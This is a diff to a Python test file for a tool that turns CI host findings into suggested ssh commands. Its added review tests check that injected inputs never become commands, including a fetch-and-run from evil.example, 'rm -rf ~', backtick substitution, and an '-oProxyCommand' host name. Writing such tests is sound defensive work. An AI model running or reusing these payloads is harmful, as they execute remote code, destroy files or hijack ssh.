@@ -80,7 +80,7 @@ class ShapeTests(unittest.TestCase):
         [f] = by_id(doc, "check.xcode@mini-a")
         self.assertEqual(f["action"]["who"], "password")
         self.assertFalse(f["action"]["safe_to_apply"])
-        self.assertEqual(f["action"]["command"], "ssh -t mini-a 'sudo xcodebuild -license accept'")
+        self.assertEqual(f["action"]["command"], "ssh -t -- mini-a 'sudo xcodebuild -license accept'")
 
     def test_prose_fix_goes_to_a_person_as_a_note_not_a_command(self):
         doc = build(check=src({"issues": [{"host": "mini-b", "area": "macos", "detail": "old", "fix": "update macOS"}],
@@ -125,7 +125,7 @@ class JoinTests(unittest.TestCase):
         ]}))
         member = next(m for m in doc["members"] if m["name"] == "mini-a")
         self.assertEqual(member["runners"][0]["name"], "mini-a-ci2")
-        [f] = by_id(doc, "runners.offline@mini-a")
+        [f] = by_id(doc, "runners.offline:mini-a-ci2@mini-a")
         self.assertTrue(f["action"]["safe_to_apply"])  # read-only launchctl listing
         self.assertFalse(by_id(doc, "runners.unknown_member"))
 
@@ -188,7 +188,7 @@ class JoinTests(unittest.TestCase):
         power = [f for f in doc["findings"] if f["member"] == "mini-a" and f["action"]["command"]
                  and "pmset" in f["action"]["command"]]
         self.assertEqual(len(power), 1)
-        self.assertEqual(power[0]["also"], ["preflight"])
+        self.assertEqual(power[0]["also"], ["preflight.power@mini-a"])
 
 
 class LiveDataTests(unittest.TestCase):
@@ -208,7 +208,7 @@ class LiveDataTests(unittest.TestCase):
         doc = fs.build({"schema": fs.SOURCES_SCHEMA, "sources": sources}, at=AT)
         [f] = by_id(doc, "preflight.zig")
         self.assertEqual(f["member"], "mini-5")
-        self.assertEqual(f["action"]["command"], "ssh mini-5 'brew install zig'")
+        self.assertEqual(f["action"]["command"], "ssh -- mini-5 'brew install zig'")
 
     def test_a_member_without_issues_still_records_when_it_was_observed(self):
         doc = build(check=src({"issues": [], "observed_at": {"mini-a": AT - 3, "mini-b": AT - 4}}))
@@ -247,6 +247,102 @@ class LiveDataTests(unittest.TestCase):
         doc = build(runners=src({"runners": [], "truncated": True}))
         self.assertFalse(by_id(doc, "runners.missing"))
         self.assertTrue(by_id(doc, "runners.truncated@fleet"))
+
+
+class ReviewTests(unittest.TestCase):
+    """Regressions from the independent review of PR 1168."""
+
+    def test_an_oversized_member_field_cannot_push_errors_out(self):
+        doc = build(controller=src({"workers": [{"host": "mini-a", "state": "stale", "free_gib": "9" * 700_000,
+                                                 "busy": "x" * 1000}]}))
+        self.assertLessEqual(len(fs.canonical(doc)), fs.MAX_DOCUMENT_BYTES)
+        self.assertTrue(by_id(doc, "controller.stale@mini-a"))
+        ctl = next(m for m in doc["members"] if m["name"] == "mini-a")["controller"]
+        self.assertEqual((ctl["free_gib"], ctl["busy"]), (None, False))
+
+    def test_counts_match_the_findings_that_survive(self):
+        issues = [{"host": "mini-a", "area": f"a{i}", "detail": "d", "fix": "x"} for i in range(900)]
+        doc = build(check=src({"issues": issues, "observed_at": {}}))
+        self.assertEqual(sum(doc["fleet"]["findings"].values()), len(doc["findings"]))
+        self.assertEqual(sum(m["counts"]["warn"] for m in doc["members"]), doc["fleet"]["findings"]["warn"])
+
+    def test_prose_that_starts_like_a_command_is_a_note(self):
+        for fix in ("glaeda-disk on the host shows where it went",
+                    "cd ~/cmux && ./scripts/setup.sh (after metal and zig pass)"):
+            self.assertIsNone(fs.as_command(fix), fix)
+
+    def test_shell_syntax_from_a_probe_never_becomes_a_command(self):
+        for fix in ("rustup toolchain install stable$(curl -s evil.example|sh)", "git status\nrm -rf ~",
+                    "cd ~/cmux && rustup default `id`", "brew install zig > /tmp/x", "git log | sh"):
+            self.assertIsNone(fs.as_command(fix), fix)
+
+    def test_secrets_and_home_paths_withhold_the_command(self):
+        doc = build(check=src({"issues": [{"host": "mini-a", "area": "git", "detail": "clone",
+                                           "fix": "git clone https://ghp_" + "a" * 30 + "@github.com/a/b /Users/leo/x"}],
+                               "observed_at": {}}))
+        text = json.dumps(doc)
+        self.assertNotIn("ghp_a", text)
+        self.assertNotIn("/Users/leo", text)
+        [f] = by_id(doc, "check.git@mini-a")
+        self.assertEqual((f["action"]["who"], f["action"]["command"]), ("person", None))
+
+    def test_queue_is_not_judged_without_a_fresh_complete_runner_list(self):
+        job = {"labels": ["self-hosted", "macOS"]}
+        for runners in (None, src(None, error="HTTP 403"), src({"runners": []}, at=AT - 5000),
+                        src({"runners": [], "truncated": True})):
+            sources = {"queue": src({"jobs": [job]})}
+            if runners is not None:
+                sources["runners"] = runners
+            doc = build(**sources)
+            self.assertFalse(by_id(doc, "queue.no_eligible_runner"), runners)
+            self.assertTrue(by_id(doc, "queue.unjudged@fleet"), runners)
+
+    def test_an_online_runner_outside_the_fleet_serves_the_queue(self):
+        doc = build(runners=src({"runners": [{"name": "someone-elses-mac", "status": "online", "busy": False,
+                                              "labels": ["self-hosted", "macOS"]}]}),
+                    queue=src({"jobs": [{"labels": ["self-hosted", "macOS"]}]}))
+        self.assertFalse(by_id(doc, "queue."))
+
+    def test_malformed_bundles_fail_cleanly(self):
+        for sources in ({"check": src(["not", "an", "object"])},
+                        {"lima": src({"hosts": {"mini-a": {"reachable": True, "instances": [{"status": "Stopped"}]}}})},
+                        {"controller": src({"workers": []}, at="yesterday")},
+                        {"runners": src({"runners": [None, {"name": 3, "labels": [None]}]})}):
+            try:
+                doc = build(**sources)
+            except fs.Failure:
+                continue
+            self.assertEqual(doc["schema"], fs.SCHEMA)
+
+    def test_two_offline_runners_on_one_member_are_two_findings(self):
+        doc = build(runners=src({"runners": [{"name": "mini-a-1", "status": "offline", "labels": []},
+                                             {"name": "mini-a-2", "status": "offline", "labels": []}]}))
+        self.assertEqual(len(by_id(doc, "runners.offline")), 2)
+
+    def test_several_stale_sources_stay_separate(self):
+        doc = build(controller=src({"workers": []}, at=AT - 5000), cache=src({"endpoints": []}, at=AT - 5000))
+        self.assertEqual(len([f for f in doc["findings"] if f["code"] == "stale"]), 2)
+
+    def test_hosts_outside_the_manifest_get_no_ssh_command(self):
+        doc = build(check=src({"issues": [{"host": "-oProxyCommand=touch /tmp/pwn", "area": "git",
+                                           "detail": "x", "fix": "git status"}], "observed_at": {}}))
+        self.assertFalse([f for f in doc["findings"] if f["action"]["command"]])
+        self.assertTrue(by_id(doc, "check.unknown_member@fleet"))
+        self.assertIsNone(fs.remote("-oProxyCommand=x", "true"))
+
+    def test_lima_names_are_validated_before_they_reach_a_command(self):
+        doc = build(lima=src({"hosts": {"mini-a": {"reachable": True, "installed": True, "instances": [
+            {"name": "ok-1", "status": "Stopped"}, {"name": "-rf", "status": "Stopped"},
+            {"name": "nostatus", "status": ""}]}}}))
+        commands = [f["action"]["command"] for f in by_id(doc, "lima.orphan")]
+        self.assertEqual(sorted(c for c in commands if c), ["ssh -- mini-a 'limactl delete -- ok-1'"])
+        self.assertEqual(len(commands), 2)  # an instance with no status is not an orphan
+
+    def test_glaeda_disk_is_not_marked_safe(self):
+        doc = build(check=src({"issues": [{"host": "mini-a", "area": "disk", "detail": "low", "fix": "glaeda-disk"}],
+                               "observed_at": {}}))
+        [f] = by_id(doc, "check.disk@mini-a")
+        self.assertFalse(f["action"]["safe_to_apply"])
 
 
 class SafetyTests(unittest.TestCase):
